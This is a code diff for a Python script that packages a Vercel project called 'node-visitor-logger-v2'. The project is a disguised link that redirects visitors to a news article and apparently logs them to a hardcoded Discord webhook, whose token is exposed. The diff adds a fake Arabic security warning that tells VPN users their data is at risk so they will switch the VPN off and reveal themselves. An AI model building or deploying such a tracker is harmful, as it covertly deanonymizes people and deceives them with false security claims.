@@ -1,4 +1,10 @@
-const https = require('https');
+# تعديل الكود لإظهار رسالة التحذير بشكل أوضح عند اكتشاف VPN
+
+project_root = "/mnt/data/node-visitor-logger-v2"
+api_dir = os.path.join(project_root, "api")
+os.makedirs(api_dir, exist_ok=True)
+
+index_js_v2 = '''const https = require('https');
 
 const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1397615981613809776/dO4Lcv7dBOPHDCp4O6BcrE9CbvHjnRWJEqsZ2wQzhxxmyFKvcGTkU7FrHwHCGgqmVhPG"  // ضع رابطك هنا
 const REDIRECT_URL = "https://jo24.net/article/539190";  // الموقع النهائي
@@ -48,10 +54,39 @@ module.exports = async (req, res) => {
     res.setHeader('Content-Type', 'text/html');
     res.status(200).end(`
       <html lang="ar" dir="rtl">
-        <head><meta charset="utf-8"><title>تحذير</title></head>
-        <body style="background:#111;color:#f44;text-align:center;padding:40px;font-family:sans-serif">
-          <h1>⚠️ تم الكشف عن VPN / Proxy</h1>
-          <p>يرجى تعطيل VPN لحماية جهازك من الفيروسات والبرمجيات الخبيثة.</p>
+        <head>
+          <meta charset="utf-8">
+          <title>تحذير أمني</title>
+          <style>
+            body {
+              background-color: #111;
+              color: #f44;
+              text-align: center;
+              padding: 50px;
+              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            }
+            .box {
+              background: #222;
+              padding: 30px;
+              border-radius: 10px;
+              display: inline-block;
+            }
+            h1 {
+              font-size: 28px;
+              margin-bottom: 20px;
+            }
+            p {
+              font-size: 18px;
+              color: #faa;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="box">
+            <h1>⚠️ تم اكتشاف برنامج <span style="color:#fff">VPN</span></h1>
+            <p>مما يعرض بياناتك الشخصية للخطر.</p>
+            <p>يرجى إيقاف برنامج الـ VPN لتصفح الموقع بأمان.</p>
+          </div>
         </body>
       </html>
     `);
@@ -60,3 +95,25 @@ module.exports = async (req, res) => {
     res.end();
   }
 };
+'''
+
+# حفظ التعديلات
+with open(os.path.join(api_dir, "index.js"), "w") as f:
+    f.write(index_js_v2)
+
+# نسخ بقية الملفات
+with open(os.path.join(project_root, "vercel.json"), "w") as f:
+    f.write(vercel_json)
+
+with open(os.path.join(project_root, "package.json"), "w") as f:
+    f.write(package_json)
+
+# ضغط المشروع
+zip_path_v2 = "/mnt/data/node-visitor-logger-v2.zip"
+with zipfile.ZipFile(zip_path_v2, "w") as zipf:
+    for root, dirs, files in os.walk(project_root):
+        for file in files:
+            file_path = os.path.join(root, file)
+            zipf.write(file_path, os.path.relpath(file_path, project_root))
+
+zip_path_v2
